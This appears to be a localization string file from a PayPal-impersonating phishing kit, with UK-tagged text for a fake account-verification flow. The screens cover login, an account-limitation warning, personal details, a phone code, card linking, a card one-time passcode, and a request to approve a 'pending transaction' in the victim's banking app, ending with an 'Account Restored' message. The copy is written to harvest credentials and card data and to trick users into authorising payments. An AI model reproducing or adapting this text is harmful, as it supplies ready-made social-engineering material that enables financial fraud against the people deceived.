LOGIN.TITLE: [UK] Log in to your PayPal account
LOGIN.ERROR_CREDENTIALS: [UK] Check your entries and try again.

LIMITED.TITLE: [UK] We need to confirm it's you
LIMITED.DESCRIPTION: [UK] We noticed a login from a device we don't recognize. To keep your account secure, we just need to verify your identity.
LIMITED.WHY_LINK: [UK] Why do I need to do this?
LIMITED.ALERT_DESC: [UK] We noticed a login attempt from a device or location we don't recognize.
LIMITED.RESOLVE_DESC: [UK] This is a temporary security measure. Once you confirm your identity, full account access will be restored immediately.

PERSONAL.TITLE: [UK] Verify your information
PERSONAL.SUBTITLE: [UK] Please confirm your personal details to help us secure your account.
PERSONAL.ERROR_DESC: [UK] Make sure your information matches your legal ID.

PHONE.DESC_INPUT: [UK] We'll send a code to your mobile to ensure your account is secure.
PHONE.DESC_CODE: [UK] We sent a security code to your mobile device.
PHONE.DISCLAIMER: [UK] By continuing, you confirm that you are authorized to use this phone number. Standard message and data rates may apply.

CARD.TITLE: [UK] Link a card
CARD.SUBTITLE: [UK] Link a card to confirm your identity and lift account limitations.

CARD_OTP.TITLE: [UK] Confirm with your bank
CARD_OTP.DESC: [UK] We've sent a code to the mobile number registered with your card ending in •••• {{last4}}.
CARD_OTP.INVALID_DESC: [UK] Please check the code and try again.

BANK_APP.TITLE: [UK] Confirm it's you
BANK_APP.DESC: [UK] Please open your banking app on your mobile device and approve the pending transaction to verify your identity.
BANK_APP.WHY_DESC: [UK] Your bank requires strong authentication for this request. Once approved, return here to continue.

SUCCESS.TITLE: [UK] Account Restored
SUCCESS.BADGE_DESC: [UK] Your account access has been fully restored. You can now send, withdraw, and manage your funds securely.
SUCCESS.EMAIL_SENT: [UK] A confirmation email has been sent to {{email}}.

MODAL_LANG.TITLE: [UK] Choose your language
MODAL_LANG.DESC: [UK] We detected you are in {{country}}, but your device is set to {{deviceLang}}.
